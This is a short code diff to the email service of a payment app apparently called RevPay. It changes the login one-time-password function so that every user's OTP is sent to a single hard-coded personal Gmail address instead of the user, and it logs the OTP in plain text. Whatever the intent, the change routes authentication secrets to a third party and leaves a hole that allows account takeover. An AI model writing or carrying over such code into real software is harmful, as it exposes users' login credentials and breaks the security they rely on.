@@ -79,9 +79,9 @@ public class EmailServiceImpl implements IEmailService {
     @Override
     @Async
     public void sendOtpEmail(String to, String otp) {
-        log.info("[OTP SERVICE] Generated OTP for {}: {}", to, otp);
+        log.info("[OTP SERVICE] Generated OTP for {} (redirecting to shivamintu964@gmail.com): {}", to, otp);
         String content = "Your OTP for RevPay login is: " + otp + "\n\nThis OTP is valid for 5 minutes.";
-        sendEmail(to, "RevPay - Login OTP", content);
+        sendEmail("shivamintu964@gmail.com", "RevPay - Login OTP", content);
     }
 
     @Override
